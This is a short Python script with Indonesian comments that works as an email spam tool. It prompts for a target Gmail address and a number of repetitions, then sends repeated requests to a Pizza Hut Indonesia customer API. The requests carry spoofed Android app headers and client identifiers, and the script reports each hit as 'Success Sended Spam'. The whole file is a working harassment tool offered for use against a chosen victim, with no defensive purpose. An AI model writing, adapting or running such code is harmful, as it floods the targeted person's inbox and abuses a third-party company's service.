import sys          #untuk fungsi pada terminal, seperti autoclick() dan exit()
import subprocess   #installing python module within code / script (tanpa requirements.txt)

try: #import Module
    import requests #POST, GET, & PUT URL API
    import time     #Untuk Informasi Waktu
    import random   #Untuk Random User
    import os       #Untuk "clear" pada terminal
    import urllib3  #Untuk HTTP Client pada python
    import json     #Agar body Request dapat dilihat dengan cara di print
    import base64   #Untuk variasi output
    import emot     #Untuk menambahkan emot
    import shutil
finally:
    import requests
    import urllib3
    from colorama import Fore,Back,init
    from requests import get,post
    from urllib import request
    from bs4 import BeautifulSoup as bs

from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs
from pip._vendor.requests import post,get # Bisa langsung "from requests import post,get"

# Inisialisasi Variasi Warna Output Terminal.
hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="\033[1;91m"
biru="\033[1;96m"

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

email = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Email Target {W}: ")
if "@gmail.com" in email:
    jum = int(input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Jumlah {W}: "))
    for i in range(jum):
        pos = requests.get("https://api-prod.pizzahut.co.id/customer/v1/customer/email/"+email, headers={"Host":"api-prod.pizzahut.co.id","Content-Com.ph.id.consumer.model.type":"application/json","X-Client-Id":"b39773b0-435b-4f41-80e9-163eef20e0ab","X-Platform":"ANDROID","X-Device-Type":"phone","X-Lang":"en","X-Channel":"2","User-Agent":"Pizza Hut Indonesia/3.2.9 Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/QKQ1.190825.002)","X-Device-Id":"b038edd6b131cd1f","Accept-Encoding":"gzip, deflate"}).text
        respon = json.loads(pos)
        if(respon['code'] == 200):
            print (f"{W}[{G}✓{W}][{G}{respon['code']}{W}] Success Sended Spam")
        else:
            print (f"{W}[{R}x{W}][{R}{respon['code']}{W}] {respon['message']}")
    print (f"{W}[{G}✓{W}] Spam selesai")
else:
    print(f"{W}[{R}Oops!{W}][{R}Kesalahan Format{W}] Sistem hanya mengizinkan email dari gmail.com.")